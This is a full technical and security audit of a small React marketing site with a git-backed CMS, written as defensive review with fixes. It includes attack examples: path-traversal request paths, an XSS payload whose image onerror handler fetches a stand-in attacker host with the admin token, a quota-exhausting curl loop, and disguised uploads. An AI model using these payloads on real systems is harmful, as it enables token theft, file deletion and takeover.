# StudyHub BD — Full Technical Assessment

**Date:** 2026-10-31
**Scope:** Entire codebase — frontend, backend/API, data layer, security, accessibility, SEO, build and operations.
**Method:** Manual source review of every file in `api/`, `client/src` (non-`ui/`), `admin/`, `content/`, plus
three specialised parallel reviews (security, React, data/deploy). Findings marked **VERIFIED** were
reproduced with a proof-of-concept. Nothing was executed against a live deployment.
**Companion docs:** [`ARCHITECTURE.md`](./ARCHITECTURE.md) · [`REMEDIATION-PLAN.md`](./REMEDIATION-PLAN.md) · [`MEMORY.md`](./MEMORY.md)

---

## Executive summary

StudyHub BD is a small, structurally simple React marketing site with a git-backed CMS.
The code is readable and the pages are cleanly data-driven. It is **not safe to run as a
public production site in its current state**, for two independent reasons.

**1. The security model collapses under one assumption.** A single shared password
unlocks a GitHub Personal Access Token with write access to the entire repository —
including `api/**` and `vercel.json`. Because a repo write triggers an automatic Vercel
deploy, anyone who obtains that password can run arbitrary code on the production server.
Three separate paths to that password or its derived token were found, one of which was
reproduced with a working proof-of-concept.

**2. The business-critical path is broken.** The contact form on `/contact` has no
`onSubmit` handler, no `name` attributes, and no endpoint. Clicking "Send Message"
performs a native GET submission, reloads the page, and silently discards the enquiry.
For a lead-generation business this is the single most expensive defect in the codebase:
**every enquiry submitted through the website since launch has been lost**, with no error
shown to the visitor and no record anywhere.

Alongside these, the site has no SEO metadata of any kind (one static `<title>`, no
description, no Open Graph tags — so every link shared on Facebook or WhatsApp renders as
a bare, image-less card), five "student success story" photos are Unsplash stock models,
one destination flag is a Bing *search results page* URL that renders as a broken image,
and the brand's golden `#D4AF37` fails WCAG AA contrast at 2.1:1 across 60 usages.

### Verdict

| Dimension | Grade | One-line justification |
|---|---|---|
| Security | **F** | 4 Critical findings; one shared password equals production RCE |
| CMS usefulness | **D** | ~20% of rendered text is not editable at all; the Contact page's phone number can never be changed |
| Backend / API | **D** | Hand-rolled JWT, no validation, no rate limiting, no tests |
| Data layer | **D** | Git-as-database; no schema, no validation, no backups, no drafts |
| Frontend code | **C** | Clean and readable, but 49 unused files and real hook/data bugs |
| Business function | **F** | The lead-capture form does not work at all |
| Accessibility | **D** | Fails WCAG AA on contrast, zoom, labels and ARIA |
| SEO | **F** | Zero metadata; CSR-only; invisible to social previews |
| Operations | **F** | No tests, lint, typecheck, staging, monitoring or backups |

### Findings by severity

| Severity | Count | Meaning |
|---|---:|---|
| 🔴 Critical | 6 | Exploitable now, or actively losing revenue. Fix before any further work. |
| 🟠 High | 20 | Serious. Fix within the first renovation sprint. |
| 🟡 Medium | 27 | Fix during the renovation. |
| 🔵 Low | 14 | Cleanup; batch them. |
| **Total** | **67** | |

---

# 🔴 CRITICAL

## SEC-01 — Path traversal and GitHub API path injection in image delete **(VERIFIED)**

**Severity:** Critical · **CWE-22, CWE-918** · `api/admin/images.js:67`, `api/_lib/github.js:88`

The delete handler validates the path with a prefix check, then passes the *unmodified*
string into a URL template:

```js
// api/admin/images.js:67
if (!filePath.startsWith(IMAGES_DIR) && !filePath.startsWith('client/public/images')) {
  return res.status(403).json({ error: 'Can only delete files from the images directory' });
}
// api/_lib/github.js:88
const url = `${GITHUB_API}/repos/${OWNER}/${REPO}/contents/${filePath}`;
```

Node's WHATWG `URL` parser collapses `..` segments *after* the check has passed, so the
request is sent to a completely different path than the one that was validated.

**Proof of concept (reproduced locally):**

| `path` sent to the API | Passes `startsWith`? | URL actually requested |
|---|---|---|
| `client/public/images/../../../api/admin/login.js` | ✅ yes | `.../contents/api/admin/login.js` |
| `client/public/images/../../../../git/refs/heads/main` | ✅ yes | `.../git/refs/heads/main` ← **escapes the `contents/` endpoint entirely** |
| `client/public/imagesEVIL/x.png` | ✅ yes | `.../contents/client/public/imagesEVIL/x.png` |
| `client/public/images/x.png?ref=main&z=1` | ✅ yes | query-string injection |

**Impact.** A holder of an admin token can delete **any file in the repository** — and
because `..` can walk past `contents/`, can direct `DELETE` requests at other GitHub REST
endpoints using the privileged PAT. Deleting `api/admin/login.js` and letting the rebuild
run removes the authentication endpoint; deleting `vercel.json` removes the security
headers and the `/admin` gate. The second `startsWith` clause is redundant and the check
also accepts the `imagesEVIL` prefix.

**Fix.**

```js
import path from 'node:path/posix';

const SAFE = /^client\/public\/images\/(?:[a-z0-9_-]+\/)?[a-z0-9._-]+\.(png|jpe?g|gif|webp)$/i;
if (typeof filePath !== 'string'
    || filePath.includes('..')
    || path.normalize(filePath) !== filePath
    || !SAFE.test(filePath)) {
  return res.status(403).json({ error: 'Invalid path' });
}
```

And in `api/_lib/github.js`, encode every segment before interpolation — this applies to
`getFile` (`:16`), `updateFile` (`:33`), `createFile` (`:61`), `deleteFile` (`:88`) and
`listDirectory` (`:112`):

```js
const safePath = filePath.split('/').map(encodeURIComponent).join('/');
```

Also ignore the client-supplied `sha` and always resolve it server-side.

---

## SEC-02 — Stored XSS through unsanitised CMS HTML (49 render sites)

**Severity:** Critical · **CWE-79** · `client/src/components/RichText.tsx:12`

```tsx
export default function RichText({ text = "", as = "span", className }: RichTextProps) {
  return createElement(as, { className, dangerouslySetInnerHTML: { __html: text } });
}
```

Every CMS string is injected as raw HTML, with no sanitising, at **49 call sites across
all 8 pages** (Home 9, Japanese 7, About/Destinations/IELTS/SuccessStories 6 each,
Services 5, Contact 4). This is not accidental: `admin/panel.html:609` is a
`contenteditable` WYSIWYG driven by `document.execCommand`, so storing HTML in the
content file is the intended design.

**Exploitation chain.** The public site and both admin panels share one origin, and the
admin bearer token lives in `localStorage`. An attacker who can write content — via a
stolen password, SEC-01, SEC-03, or a malicious collaborator — stores:

```html
<img src=x onerror="fetch('//attacker/'+localStorage.cms_token)">
```

Every visitor executes it. The next time an admin loads any public page, their token is
exfiltrated, which yields repo write, which yields production RCE (see SEC-04). The same
injection can silently repoint the "Register" call-to-action at a phishing form that
harvests student passport and payment details.

**Fix.** Sanitise on render *and* on write.

```tsx
// client/src/components/RichText.tsx
import DOMPurify from "dompurify";
import { useMemo } from "react";

const clean = useMemo(() => DOMPurify.sanitize(text, {
  ALLOWED_TAGS: ["b","strong","i","em","br","p","span","ul","ol","li","a"],
  ALLOWED_ATTR: ["href","target","rel","style"],
}), [text]);
```

Then mirror the same allow-list server-side in `api/admin/content.js` before committing,
and convert plain-text fields (`address`, `story.university`, list items) to ordinary
`{text}` rendering so `RichText` is used only where markup is genuinely needed.

---

## SEC-03 — `/admin.html` is a second, publicly reachable admin panel

**Severity:** Critical · **CWE-306, CWE-79, CWE-1021** · `client/public/admin.html`

`client/public/` is copied verbatim into `dist/public`, which is the Vercel output
directory. `client/public/admin.html` is therefore served as a **plain static file at
`/admin.html`, with no authentication in front of it**, completely bypassing the HTTP
Basic wall that `vercel.json` and `api/admin-panel.js` put on `/admin`.

It is a second, older (409-line vs 1,246-line) CMS that talks to the same
`/api/admin/*` endpoints with the same `localStorage` token. Additional problems:

- **No HTML escaping anywhere.** `showStatus` writes server error text straight into
  `innerHTML`; the image grid interpolates `img.name`, `img.publicPath`, `img.path` and
  `img.sha` into `innerHTML` and into unquoted-context attributes. The newer
  `admin/panel.html` at least has an `xe()` escape helper (though it does not apply it to
  filenames either — see SEC-13).
- **No security headers.** `X-Frame-Options`, CSP and `noindex` are set only on the
  `/admin` route, so `/admin.html` is framable for clickjacking and indexable by search
  engines.

**Fix.** Delete `client/public/admin.html`. One admin panel, one gate. If it must be kept
for reference, move it outside `client/public/` so it is never deployed.

---

## SEC-04 — Admin password equals production remote code execution (design flaw)

**Severity:** Critical · **CWE-269, CWE-250** · `api/_lib/github.js:3-12`, `vercel.json:2`

The privilege chain has no break in it:

```
ADMIN_PASSWORD → 8h JWT → /api/admin/* → GITHUB_TOKEN (repo write)
               → commit to api/**  → Vercel auto-deploy → arbitrary code execution
```

The PAT writes directly to the production branch, and the writable surface includes the
serverless functions themselves. An attacker who reaches any admin credential can
overwrite `api/admin/login.js` with a backdoor and have Vercel deploy it automatically.
This is what turns every High finding below into a Critical one.

**Fix (defence in depth, all four):**

1. Replace the classic PAT with a **fine-grained token scoped to one repository with
   `Contents: write` only**.
2. Point `GITHUB_BRANCH` at a dedicated `content` branch, not `main`.
3. Enable **branch protection on `main`** with required review, plus a `CODEOWNERS` entry
   covering `api/**`, `vercel.json` and `package.json`.
4. Best: move content out of the code repository entirely so a CMS write can never touch
   code (see `REMEDIATION-PLAN.md`).

---

## BIZ-01 — The contact form does not work; every lead is silently lost

**Severity:** Critical (business) · `client/src/pages/Contact.tsx:87-145`

```tsx
<form className="space-y-6">
  <input type="text" placeholder="Your name" className="..." />
  ...
  <button type="submit" className="...">Send Message</button>
</form>
```

There is **no `onSubmit`, no `action`, no `name` attribute on any field, no state, and no
API endpoint**. Submitting performs a native GET to the current URL. The page reloads,
the fields clear, and the visitor reasonably concludes the message was sent. Nothing is
stored, emailed, or logged anywhere.

There is no `/api/contact` endpoint in the codebase, so this was never wired up. The only
functioning lead path is `global.registrationLink`, which points at a **Google Form
(`forms.gle`)** — meaning enquiries that do work live entirely outside this system, with
no CRM, no notification and no analytics.

Secondary defects in the same block: labels have no `htmlFor`/`id` pairing (WCAG 1.3.1),
there is no `required`, no `autocomplete`, and the `<select>` options have no `value`.

**Fix.** Build a real lead pipeline — this is the highest-value item in the whole project:

1. Add `POST /api/contact`: validate with zod, rate-limit by IP, add a honeypot field.
2. Persist the lead (see `REMEDIATION-PLAN.md`; even a Google Sheet or Airtable beats the
   current nothing) **and** send an email/WhatsApp notification to the office.
3. Wire the form with `react-hook-form` + `zod` (both already installed), add
   `id`/`htmlFor`/`name`/`autoComplete`/`aria-invalid`, show inline validation errors and
   a `sonner` success toast.
4. Until that ships, **replace the form with the registration link** so visitors are not
   misled into thinking they have contacted the business.

---

## CNT-06 — The Contact page's phone, email and address can never be changed **(VERIFIED)**

**Severity:** Critical (business) · `client/src/pages/Contact.tsx:34,44,45,56,69,175` vs `admin/panel.html:918-923`

The contact details are stored **twice** — once in `global.*` and again in `contact.*`.
The two consumers disagree about which copy is authoritative:

| Renders | Reads from | Editable in the CMS? |
|---|---|---|
| `Header`, `Footer`, `WhatsAppButton` | `content.global.phone1` / `email` / `address` | yes |
| **`/contact` page** | `content.contact.phone1` / `phone2` / `email` / `address` / `website` | **no** |

Both admin panels write only `c.global.*`. Neither writes `c.contact.phone1`, `phone2`,
`email`, `address` or `website` — there is **no form field for them anywhere** (verified:
zero matches for those paths in either panel's save routine). The panel *does* edit
`contact.hero`, `contact.mapEmbedUrl` and the contact CTA fields, which makes the gap easy
to miss.

**Live consequence:** an admin who updates the business phone number sees it change in the
header, the footer and the WhatsApp button — and the **Contact page, the page people
actually visit to find the phone number, keeps showing the old one forever.** The only fix
is the raw-JSON escape hatch or a developer. The same applies to the email address
(rendered twice, including the `mailto:` link), the website and the office address.

**Fix.** Delete the `contact.*` duplicates, point `Contact.tsx` at `content.global.*`, and
in the renovation enforce single-source-of-truth in the schema so one field cannot be
modelled twice.

---

# 🟠 HIGH

## SEC-05 — No rate limiting or lockout on either authentication path

**Severity:** High · **CWE-307, CWE-287** · `api/admin/login.js`, `api/admin-panel.js`

Neither `/api/admin/login` nor the HTTP Basic gate limits attempts. The 500 ms delay at
`login.js:39` is per-request and does not serialise anything, so parallel requests defeat
it entirely. Two online guessing oracles exist against the *same* password.

Related weaknesses in the same files:

- `ADMIN_USERNAME` is read at `admin-panel.js:19` but **never checked by
  `/api/admin/login`** — the JWT path is password-only.
- `admin-panel.js:30` uses `decoded.split(':')`, so an admin password containing a colon
  can never authenticate.
- `login.js:26` calls `Buffer.from(password)` before any type check — a JSON body of
  `{"password": 123}` throws and returns an unhandled 500.
- `login.js:28` compares lengths first, leaking password length.
- `.env.example` ships `change-this-strong-password` and `change-this-long-random-secret`.
  If either placeholder reaches production, an attacker can mint their own valid admin
  tokens offline using the algorithm in `api/_lib/auth.js:7-15`.

**Fix.** Add `@upstash/ratelimit` or Vercel WAF (5 attempts / 15 min / IP) on both paths;
refuse to start if `JWT_SECRET` is shorter than 32 chars or matches `/change-this/`;
`typeof password === 'string'` guard; `indexOf(':')` instead of `split`; compare with
`crypto.timingSafeEqual` over SHA-256 digests; use separate credentials per mechanism.

## SEC-06 — Unauthenticated `/api/content` burns the GitHub PAT quota

**Severity:** High · **CWE-770** · `api/content.js:5-7,18`, `vercel.json:15-19`

Every anonymous page view triggers one *authenticated* GitHub API call, and
`Cache-Control: no-cache, no-store` plus the blanket `no-store` on `/api/*` prevents any
CDN caching. A PAT allows roughly 5,000 requests/hour.

A trivial `while true; do curl https://site/api/content; done` exhausts the quota. Then
`/api/content` returns 503 for everyone, and — worse — **the admin can no longer save**,
because `/api/admin/content` uses the same token. The site silently falls back to the
stale bundled content with no alert to anyone.

**Fix.** Set `Cache-Control: public, s-maxage=60, stale-while-revalidate=600` on
`api/content.js`, remove `/api/content` from the blanket `no-store` rule in `vercel.json`
(keep `no-store` for `/api/admin/*`), and add `ETag`/`If-None-Match` against GitHub.

## SEC-07 — Unvalidated CMS URLs in `href` and `iframe src`

**Severity:** High · **CWE-79, CWE-601** · multiple

| Location | Sink |
|---|---|
| `Footer.tsx:21-30` | `href={g.socialMedia.*}` |
| `Header.tsx:55,86`, every page CTA | `href={g.registrationLink}` |
| `Contact.tsx:163` | `<iframe src={c.mapEmbedUrl}>` — no `sandbox`, no `title` |
| `Contact.tsx:69` | `https://${c.website}` |
| `Contact.tsx:178` | `c.mapDirectionsUrl` |

A `javascript:` URI in any of these executes on click. The iframe has no `sandbox`, so
any origin can be framed inside the site. Social links are currently `"#"`, rendering
dead links that jump to the top of the page.

**Fix.**

```ts
export const safeUrl = (u?: string, allowed = ["https:", "http:", "mailto:", "tel:"]) => {
  try { return u && allowed.includes(new URL(u, location.origin).protocol) ? u : "#"; }
  catch { return "#"; }
};
```

Apply to every content-driven `href`. For the map iframe additionally require host
`www.google.com` and path prefix `/maps/embed`, and add
`sandbox="allow-scripts allow-same-origin"` plus a `title`. Hide social icons whose URL is
empty or `#` rather than rendering dead links.

## SEC-08 — No security headers on the SPA or `/admin.html`

**Severity:** High · **CWE-693, CWE-1021** · `vercel.json:7-21`

Headers are set only on `/admin` and `/api/*`. The public site and `/admin.html` have no
CSP, no `X-Frame-Options`/`frame-ancestors`, no HSTS, no `nosniff`, no `Referrer-Policy`
and no `Permissions-Policy`. With no `connect-src`, any injected script (SEC-02) can
exfiltrate to any origin. `index.html:21` also loads a third-party analytics script with
no SRI.

**Fix.** Add a global rule in `vercel.json`:

```json
{ "source": "/(.*)", "headers": [
  { "key": "Content-Security-Policy", "value": "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; font-src https://fonts.gstatic.com; img-src 'self' data: https:; frame-src https://www.google.com; connect-src 'self'; frame-ancestors 'none'; base-uri 'none'; object-src 'none'" },
  { "key": "X-Content-Type-Options", "value": "nosniff" },
  { "key": "X-Frame-Options", "value": "DENY" },
  { "key": "Referrer-Policy", "value": "strict-origin-when-cross-origin" },
  { "key": "Strict-Transport-Security", "value": "max-age=63072000; includeSubDomains" }
]}
```

Move the admin panel's inline scripts to external files first, or the CSP will break them.

## SEC-09 — Error detail disclosure, including on the public endpoint

**Severity:** High · **CWE-209** · `api/content.js:26`, `api/admin/content.js:25,54`, `api/admin/images.js:54,84`, `api/admin/upload.js:72`, `api/_lib/auth.js:51`

Raw GitHub error bodies are echoed to clients. `api/content.js` is **unauthenticated**, so
anyone can `curl /api/content` during an outage and learn the repo owner, repo name,
branch, token scope and rate-limit state. `requireAuth` returns
`Unauthorized: ${err.message}`, distinguishing "invalid signature" from "token expired".

**Fix.** Return generic messages (`'Upstream unavailable'`, `'Unauthorized'`) and log
detail server-side only.

## SEC-10 — Upload accepts SVG, trusts client MIME type, and never checks the extension

**Severity:** High · **CWE-434** · `api/admin/upload.js:5,24,29`

- `image/svg+xml` is in `ALLOWED_TYPES`. An SVG is an HTML-ish document; uploaded to
  `client/public/images/` it is served **same-origin** and `<svg onload="...">` executes.
- `mimeType` is taken from the request body and never verified against the file bytes.
- The filename sanitiser `filename.replace(/[^a-zA-Z0-9._-]/g, '')` preserves the
  extension, so `evil.html` with `mimeType: "image/png"` is written as
  `client/public/images/evil.html` and served as HTML.
- `filename: ".."` survives the sanitiser (`.` is allowed).
- `data` is not validated as base64, and the size estimate at `:37` is computed on the
  wrong string.
- `getFile` failures of *any* kind are swallowed as "file does not exist" (`:48`), so a
  rate-limit error becomes a blind overwrite.
- `config.api.bodyParser.sizeLimit: '10mb'` (`:76-82`) is a **Next.js** convention and is
  inert on Vercel's generic Node runtime, which caps bodies around 4.5 MB — so the 5 MB
  check is unreachable.

**Fix.** Drop SVG. Require the extension to match the MIME type, verify magic bytes
(`89504E47`, `FFD8FF`, `47494638`, `52494646…57454250`), validate base64 with a regex and
size with `Buffer.from(b64,'base64').length`, type-check every field, and abort on any
non-404 `getFile` error.

## SEC-11 — Hand-rolled JWT with weak verification

**Severity:** High · **CWE-345, CWE-613** · `api/_lib/auth.js:17-54`

- `signature !== expected` (`:25`) is a non-constant-time comparison.
- `payload.exp && …` (`:27`) makes expiry **optional** — a token without `exp` never expires.
- The JOSE header is never parsed or validated.
- `requireAuth` (`:37-54`) **never checks `payload.role`**, so any validly-signed payload
  is treated as admin.
- 8-hour TTL with no `jti` and no revocation path; the only way to invalidate a leaked
  token is rotating `JWT_SECRET`.
- No `iss`/`aud`.

**Fix.** Require `exp` and `role === 'admin'`; parse the header and require `alg === 'HS256'`;
compare with `crypto.timingSafeEqual`; shorten the TTL to 30–60 min with a refresh;
prefer `httpOnly`, `Secure`, `SameSite=Strict` cookies over `localStorage`. Strongly
consider replacing the whole file with `jose`.

## SEC-12 — Content writes have no schema validation and no size cap

**Severity:** High · **CWE-20, CWE-770** · `api/admin/content.js:34-46`

Any truthy `content` is stringified and committed — an array, a string, or `{}` all pass.
`message` is free-form attacker-controlled commit text.

The failure mode is unusually bad: the GitHub Contents API returns an **empty body with
`encoding: "none"` for files over 1 MB**. `JSON.parse('')` then throws, so `/api/content`
503s *and* `/api/admin/content` GET 500s — the CMS can no longer read or repair the file
**through its own UI**. Recovery requires direct repo access. The admin panel exposes a
raw JSON textarea, so a single bad paste can trigger this.

**Fix.** Validate against a shared zod schema (see FE-02) before committing, cap
`JSON.stringify(content).length` at ~512 KB, strip `message` to 100 safe characters, and
fetch large files via `download_url` or the blob API.

## FE-02 — No schema or runtime validation for CMS data

**Severity:** High · `client/src/contexts/CmsContext.tsx:4,27`

```ts
export type SiteContent = typeof defaultContent;   // inferred from the JSON file
.then((data: SiteContent) => { if (!cancelled) setContent(data); })  // unchecked cast
```

`res.json()` returns `any`, asserted to `SiteContent` without any check. `zod` is already
a dependency but is unused.

**Impact.** If a save removes or renames a key, the next page render throws — for example
`WhatsAppButton.tsx:8` calls `content.global.whatsapp.startsWith(...)`, which is a
`TypeError` on `undefined`. The only safety net is `ErrorBoundary`, which then shows
visitors a raw JavaScript stack trace (FE-04). Because the type is *inferred from the
current file*, shape drift is invisible to TypeScript.

**Fix.** Write `shared/content-schema.ts` with zod, derive `SiteContent` via `z.infer`,
`safeParse` the API response and keep the fallback on failure, and reuse the same schema
server-side in `api/admin/content.js` so invalid content can never be committed.

## FE-03 — CMS fetch: no abort, errors swallowed, `loading` unused

**Severity:** High · `client/src/contexts/CmsContext.tsx:20-40`

- The `cancelled` flag stops the state update but not the request — use `AbortController`.
- `.catch(() => {})` swallows every failure, so a CMS outage is invisible to both visitors
  and operators. An admin whose save failed sees no difference.
- `loading` is exposed but **no consumer reads it**. The page renders the build-time
  snapshot, then swaps to remote content, producing a visible content flash.

**Fix.** Use `AbortController`, add an `error` field to the context, log non-abort
failures, and use `loading` to suppress the flash (or drop the runtime fetch once content
is cached at the CDN — see SEC-06).

## SEO-01 — No SEO metadata of any kind

**Severity:** High · `client/index.html`

For a marketing site whose entire purpose is organic and social discovery, this is a
revenue-level defect:

- One static `<title>Study Hub BD</title>` for all 8 routes. **No** `<meta name="description">`,
  no canonical, no `og:*`, no `twitter:*`, no favicon, no `theme-color`, no JSON-LD.
- No `robots.txt`, no `sitemap.xml` (`client/public/` contains only `admin.html`,
  `images/` and `.gitkeep`).
- The body is empty until JS runs. **Facebook, WhatsApp and LinkedIn do not execute
  JavaScript** — every link the agency shares renders as a bare "Study Hub BD" card with
  no description and no image. For a Bangladeshi consultancy that markets primarily
  through Facebook and WhatsApp, this is the highest-impact marketing defect in the build.
- `index.html:10-14` still contains a literal `THIS IS THE START OF A COMMENT BLOCK,
  BLOCK TO BE DELETED` template placeholder.

**Fix, in order:** (1) add description/OG/Twitter/favicon/JSON-LD (`EducationalOrganization`
+ `LocalBusiness`) to `index.html` today; (2) add `robots.txt` and `sitemap.xml`;
(3) per-route `<title>`/description via React 19's native metadata hoisting, with the
strings stored in the CMS; (4) pre-render the 8 static routes at build time
(`vite-react-ssg`) or migrate to Next.js/Astro.

## CNT-01 — Broken, fake and third-party images

**Severity:** High · `content/site-content.json`

| Line | Problem |
|---|---|
| 246 | `destinations[0].image` holds `https://www.bing.com/images/search?view=detailV2&...` — a **search results page, not an image** (~440 chars of tracking parameters). **Currently dormant:** `Destinations.tsx:39` renders only `country.flag` (an emoji), never `.image` — so it will break the moment destination imagery is wired up, not today. The other 9 `destinations[*].image` values are `""`. |
| 409, 419, 429, 439, 449 | All five "success story" student photos are **Unsplash stock models**, and two of the five URLs are duplicated. Presenting stock photos as named real students with named universities is a trust and advertising-standards risk for a regulated consultancy. |
| 399 | A story photo is hotlinked from `i.ibb.co.com` — a third-party host that can disappear or be repointed. |
| — | **9 `"image": ""` fields.** `<img src="">` makes some browsers re-request the page URL. |

**Fix.** Host all images under `/images/` on your own domain. Replace stock photos with
real, consented student photos or a neutral initials avatar. Guard rendering with
`story.image ? <img/> : <Initials/>`. Validate image URLs in the content schema (FE-02).

## OPS-01 — No tests, no linting, no typecheck in the pipeline

**Severity:** High · `package.json`, `vercel.json:2`

There are **zero tests** in the repository. There is no ESLint config and no `lint`
script — so `eslint-plugin-react-hooks` and `jsx-a11y`, which would have caught several
findings in this report automatically, never run. `vitest` is installed but unused.
`tsc --noEmit` exists as `npm run check` but is **not part of the build**, so a type error
deploys to production. `api/*.js` is plain JavaScript and is not type-checked at all.
There is no staging environment: every content save and every push goes straight to
production.

**Fix.** Add ESLint (`react-hooks`, `jsx-a11y`), make the Vercel build run
`tsc --noEmit && vitest run`, add smoke tests for the content schema and `RichText`
sanitising, and enable Vercel preview deployments as a staging gate.

---

# 🟡 MEDIUM

## Accessibility

| ID | Finding | Location |
|---|---|---|
| **A11Y-01** | `maximum-scale=1` in the viewport meta **blocks pinch-zoom** — WCAG 1.4.4 failure, and a direct problem for the older parents who co-decide on study-abroad spending | `client/index.html:6-8` |
| **A11Y-02** | Brand golden `#D4AF37` on white measures **2.1:1** — WCAG AA requires 4.5:1 for body text and 3:1 for large text. Used in **60 places** (`text-golden`). `text-white` on the golden gradient button is the same 2.1:1; black on golden is 8.3:1 and passes. The button styling is inconsistent — `Contact.tsx` uses black text, `Header.tsx` uses white | `client/src/index.css:50`, 60 call sites |
| **A11Y-03** | Contact form labels have no `htmlFor`/`id` pairing; no `required`, no `autocomplete` | `Contact.tsx:87-145` |
| **A11Y-04** | Mobile menu toggle is icon-only with no `aria-label`, `aria-expanded` or `aria-controls`; no Escape handling, no focus management, no `aria-current` on the active route | `Header.tsx:64-69` |
| **A11Y-05** | WhatsApp button is icon-only with only `title`; the tooltip is hover-only (unreachable by keyboard and touch); `animate-bounce`/`animate-pulse` run forever with no `prefers-reduced-motion` guard (WCAG 2.2.2) | `WhatsAppButton.tsx:18-39` |
| **A11Y-06** | Heading order skips levels (Footer uses `h3` with no `h2` ancestor on every page); no skip-to-content link; `<main>` has no `id` | `Footer.tsx:16`, `App.tsx:47` |
| **A11Y-07** | Expandable country cards have no `aria-expanded`/`aria-controls`; flag emoji has no `role="img"` or label | `Destinations.tsx:68-80` |

**Recommended palette fix:** keep `#D4AF37` for large display text, decorative borders and
backgrounds only; introduce a darker `--golden-text: #8A6D0B` (≈5.4:1 on white) for body
copy and links; always pair golden backgrounds with black text.

## Frontend

| ID | Finding | Location |
|---|---|---|
| **FE-04** | `ErrorBoundary` renders the raw `error.stack` to end users — internal paths disclosed, and meaningless to a prospective student | `ErrorBoundary.tsx:39-43` |
| **FE-05** | `CmsContext` provider value `{{ content, loading }}` is a new object every render, re-rendering every consumer. Same in `ThemeContext` | `CmsContext.tsx:43` |
| **FE-06** | No route-level code splitting — all 9 pages are in one eager chunk | `App.tsx:3-18` |
| **FE-07** | No `width`/`height`, `loading="lazy"` or `decoding` on any image (CLS). `client/public/images/logo.png` is **260 KB for a ~64 px display** | `Home.tsx`, `SuccessStories.tsx`, `Header.tsx:29` |
| **FE-08** | Google Fonts loaded via a CSS `@import` — render-blocking. `index.html` contains a commented-out `<link rel="preconnect">` block that was meant to replace it and never was | `index.css:1` |

## Content and data

| ID | Finding | Location |
|---|---|---|
| **CNT-02** | `copyrightYear: "2024"` — stale by two years. All four `socialMedia` links are `"#"`. "Privacy Policy" and "Terms of Service" link to `"#"` (dead links; a trust issue, and a legal exposure for a business handling passport and financial data) | `site-content.json:13-18`, `Footer.tsx:86-87` |
| **CNT-03** | `mapEmbedUrl` is a hand-fabricated string with a null place ID (`0x0:0x0`), rounded coordinates (`2d89.9!3d24.4`) and a placeholder timestamp (`v=1234567890`) — it shows a generic area, not the office | `site-content.json:721` |
| **CNT-04** | `contact.phone1/email/address` duplicate `global.*`; nothing keeps them in sync | `site-content.json` |
| **CNT-05** | Collection items lack stable `id`/`slug`/`order`; ordering is array position. No draft/publish split — saving publishes instantly to production. No i18n structure: English and Bengali are mixed inside the same string fields | `site-content.json` |

## Operations and security (medium)

| ID | Finding | Location |
|---|---|---|
| **SEC-13** | `admin/panel.html` writes image filenames into `innerHTML`/attributes without its own `xe()` escape helper; inline `onclick` handlers are incompatible with the CSP in SEC-08. `xe()` escapes `& < > "` but not `'` | `panel.html:1146-1151,1219` |
| **SEC-14** | Recursive image listing is sequential and unbounded (no depth or count cap, one GitHub call per directory), and `catch { return [] }` hides every failure | `images.js:7-39` |
| **SEC-15** | CORS `Access-Control-Allow-Origin: *` on `/api/content` while the code comment claims "same-origin" | `content.js:5` |
| **OPS-02** | Build runs `npm install --legacy-peer-deps`, masking a real peer-dependency conflict and ignoring the lockfile. Should be `npm ci` | `vercel.json:2` |
| **OPS-03** | `studyhubbdwadmin-main.zip` (470 KB) is committed at the repo root. It is byte-identical to the working tree and contains no secrets — pure bloat. `.gitignore` also misses `.env.production`, `.env.staging`, `.env.development`, `*.pem`, `*.key`, `.vercel/` and `*.zip` | repo root, `.gitignore:11-15` |
| **OPS-04** | No error tracking, no uptime monitoring, no alerting, no content backup/restore procedure. Analytics is configured but broken (FE-10) | — |
| **OPS-05** | `CLEAN_PUSH_INSTRUCTIONS.txt` documents a prior secret-in-git incident ("ensured `.env.example` contains no real token"). The current tree and the zip are clean, but **if a PAT was ever pushed it must be treated as compromised and rotated**, regardless of the history having been stripped | repo root |

---

# 🔵 LOW

| ID | Finding | Location |
|---|---|---|
| **FE-09** | **Dead code:** `components/Map.tsx` (Google Maps loader for a `forge.butterfly-effect.dev` proxy), `components/ManusDialog.tsx`, `client/src/const.ts` (`getLoginUrl` for a non-existent OAuth portal), `shared/const.ts`, `hooks/useMobile.tsx`, `hooks/usePersistFn.ts`, `hooks/useComposition.ts` | — |
| **FE-10** | **49 of 53 `components/ui/*` files are unused** (6,189 LOC). Only `button`, `card`, `sonner`, `tooltip` are reached. Tree-shaking keeps them out of the bundle, so the cost is install size, typecheck time and confusion | `client/src/components/ui/` |
| **FE-11** | **Unused dependencies:** `framer-motion`, `axios` (code uses `fetch`), `zod`, `streamdown`, `nanoid`, plus ~25 `@radix-ui/*` packages reachable only through dead `ui/` files | `package.json` |
| **FE-12** | The Umami analytics tag resolves to the literal `%VITE_ANALYTICS_ENDPOINT%/umami` when the env vars are unset — a 404 and a console error on every page load, and **no analytics are being collected at all** | `index.html:20-23` |
| **FE-13** | **Manus template residue:** `vite-plugin-manus-runtime` injects runtime code into the production bundle; `allowedHosts` lists `*.manus*.computer`; `@assets` aliases `attached_assets/`, which does not exist; `tsconfig.json` includes `server/**/*`, which does not exist | `vite.config.ts`, `tsconfig.json` |
| **FE-14** | Nav labels, footer links, contact-form labels and subject options, and the WhatsApp message are hardcoded in components rather than the CMS — the admin cannot change them | `Header.tsx:12-21`, `Footer.tsx:40-54`, `Contact.tsx`, `WhatsAppButton.tsx:11` |
| **FE-15** | No scroll restoration — wouter does not scroll to top on navigation, so users land mid-page on the next route | `App.tsx` |
| **FE-16** | `NotFound` renders `min-h-screen` inside `<main>` between header and footer, producing a double-height layout. The explicit `/404` route is redundant alongside the catch-all | `App.tsx:31-33`, `NotFound.tsx` |
| **FE-17** | Index-based `key` props on CMS lists; several of these collections already carry `id` fields that should be used instead | `Home.tsx:59`, `About.tsx:57`, `Services.tsx:34`, `SuccessStories.tsx:38,61`, `Destinations.tsx:52` |
| **FE-18** | `ui/sonner.tsx` reads the theme from `next-themes`, but the app provides its own `ThemeContext` — toasts always resolve to "system" and ignore the app theme | `ui/sonner.tsx:1` |
| **SEO-02** | A SPA 404 returns HTTP 200 to crawlers (soft 404). `NotFound` has no `<meta name="robots" content="noindex">` | `NotFound.tsx` |
| **SEC-16** | `api/admin-panel.js` sets its security headers only on the 200 path; the 401 and 500 responses carry none. No `Vary: Authorization`. Basic auth has no logout | `admin-panel.js:5-7,23,40-43` |
| **SEC-17** | Page layouts (hero section, CTA section) are near-copy-pasted across 8 pages — roughly 400 lines removable via a shared `<PageHero>` and `<CtaSection>` | `client/src/pages/` |
